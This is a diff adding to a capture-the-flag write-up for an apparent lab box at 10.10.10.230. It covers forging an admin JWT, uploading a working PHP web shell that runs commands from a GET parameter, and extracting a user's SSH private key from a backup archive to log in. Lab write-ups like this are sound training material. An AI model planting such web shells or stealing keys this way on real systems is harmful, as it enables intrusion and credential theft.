@@ -76,7 +76,7 @@ There I found what looked like a JWT token.
 
 Opening the token in jwt.io I can see the tokens details. 
 
-![image](https://user-images.githubusercontent.com/5285547/127501076-ccb4e140-18b4-450c-984f-b69427cfcd86.png)
+![image](https://user-images.githubusercontent.com/5285547/127507282-88faa774-8e99-4a85-bfaa-1e4816843474.png)
 
 Seeing the "privKey.key" and "RS265" I knew this was vunerable as we should be able to use our own  
 certificate to authenticate the jwt token. 
@@ -113,13 +113,80 @@ Doing so without the signing of the token will invalidate it.
 
   ![image](https://user-images.githubusercontent.com/5285547/127503185-0131b6b5-1410-4f06-8e88-2c6f488fff57.png)
 
-  Now refresh the page to become the real admin and check out the new notes. 
+   Now refresh the page to become the real admin and check out the new notes. 
 
   ![image](https://user-images.githubusercontent.com/5285547/127507069-16871b30-886d-429f-85c6-f6b095b25412.png)
 
 
 
+One of the notes suggests that PHP can be executed and now we have access to upload files,  
+let's try for a reverse shell. 
 
+Upload a basic shell first. 
+
+shell_web.php
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
+![image](https://user-images.githubusercontent.com/5285547/127510079-39ebfe5a-4cac-4a44-bdf4-9ba296077934.png)
+
+Uploading this and then viewing the file, we can now execute commands. 
+Then move onto a better shell. 
+
+![image](https://user-images.githubusercontent.com/5285547/127510331-a1fa62dc-551b-4f15-b38d-4d6f63e2b8c4.png)
+
+
+## User
+
+Looking around the system, I find a strange backup in the /var/backups folder
+
+```
+home.tar.gz
+```
+
+I copy it to the /tmp directory and have a look inside to find an ssh key for noah the user on the box. 
+
+```
+cp /home.tar.gz /tmp
+cd /tmp
+gunzip home.tar.gz
+tar -xvf home.tar
+cd home/noah/.ssh
+cat id_rsa
+```
+
+Using the id_rsa key we can login as noah
+
+```
+nano noah_id_rsa
+#Paste in the id_rsa you got
+#close and save file
+
+chmod 600 noah_id_rsa
+ssh -i noah_id_rsa noah@10.10.10.230
+```
+
+![image](https://user-images.githubusercontent.com/5285547/127514317-703f435b-7c36-4f02-9e83-5af12cab84a8.png)
+
+Then go ahead and get the user.txt flag! 
+
+## Root
 
 
 
